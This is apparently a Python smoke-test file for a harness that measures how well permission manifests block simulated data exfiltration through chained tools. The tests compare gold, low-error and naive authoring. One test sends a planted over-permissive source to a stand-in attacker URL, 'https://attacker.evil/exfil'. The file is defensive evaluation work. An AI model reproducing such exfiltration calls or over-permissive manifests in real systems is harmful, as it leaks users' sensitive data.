"""Smoke tests for the manifest-scaling harness. Run directly:

    PYTHONPATH=. python tests/smoke.py
"""
from __future__ import annotations

import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from scaling.catalog import build_catalog, gold_manifests, Role
from scaling.authoring import author, GOLD, LOW_ERROR, NAIVE_CALIBRATED
from scaling.workflows import evaluate_catalog, _run_chain, _by_role


def test_gold_blocks_all_attacks():
    for n in (10, 50, 200):
        specs = build_catalog(n)
        ac = author(specs, GOLD, random.Random(0))
        res = evaluate_catalog(specs, ac.manifests, len(ac.exfiltratable_sources),
                               ac.n_sensitive, "gold", 0, random.Random(1))
        assert res.attack_block_rate == 1.0, (n, res.attack_block_rate)
        assert res.planted_holes == 0
        assert res.realized_exfil == 0
    print("PASS gold blocks all attacks at N in {10,50,200}")


def test_gold_allows_benign():
    specs = build_catalog(100)
    ac = author(specs, GOLD, random.Random(0))
    res = evaluate_catalog(specs, ac.manifests, 0, ac.n_sensitive,
                           "gold", 0, random.Random(2))
    assert res.benign_completion_rate == 1.0, res.benign_completion_rate
    print(f"PASS gold benign completion = {res.benign_completion_rate:.3f}")


def test_planted_hole_exfiltrates():
    # one over-permissive sensitive source must be exfiltratable through engine
    specs = build_catalog(50)
    ac = author(specs, NAIVE_CALIBRATED, random.Random(3))
    assert ac.exfiltratable_sources, "expected holes in calibrated-high regime"
    roles = _by_role(specs)
    http = roles[Role.HTTP_SINK][0].name
    hole = sorted(ac.exfiltratable_sources)[0]
    allowed = _run_chain(ac.manifests, hole, [], http,
                         {"url": "https://attacker.evil/exfil"})
    assert allowed, "planted over-permission failed to exfiltrate"
    # and a correctly-authored sensitive source must NOT exfiltrate
    safe = [s.name for s in roles[Role.SENSITIVE_SOURCE]
            if s.name not in ac.exfiltratable_sources]
    if safe:
        assert not _run_chain(ac.manifests, safe[0], [], http,
                              {"url": "https://attacker.evil/exfil"})
    print(f"PASS planted hole exfiltrates; correct source blocked "
          f"({len(ac.exfiltratable_sources)}/{ac.n_sensitive} holes)")


def test_calibrated_high_worse_than_low_error():
    specs = build_catalog(200)
    nb = author(specs, NAIVE_CALIBRATED, random.Random(4))
    cb = author(specs, LOW_ERROR, random.Random(4))
    rn = evaluate_catalog(specs, nb.manifests, len(nb.exfiltratable_sources),
                          nb.n_sensitive, "naive_calibrated", 4, random.Random(5))
    rc = evaluate_catalog(specs, cb.manifests, len(cb.exfiltratable_sources),
                          cb.n_sensitive, "low_error", 4, random.Random(5))
    assert rn.attack_block_rate < rc.attack_block_rate
    print(f"PASS calibrated-high block {rn.attack_block_rate:.3f} < "
          f"low-error block {rc.attack_block_rate:.3f}")


if __name__ == "__main__":
    test_gold_blocks_all_attacks()
    test_gold_allows_benign()
    test_planted_hole_exfiltrates()
    test_calibrated_high_worse_than_low_error()
    print("ALL SMOKE TESTS PASSED")
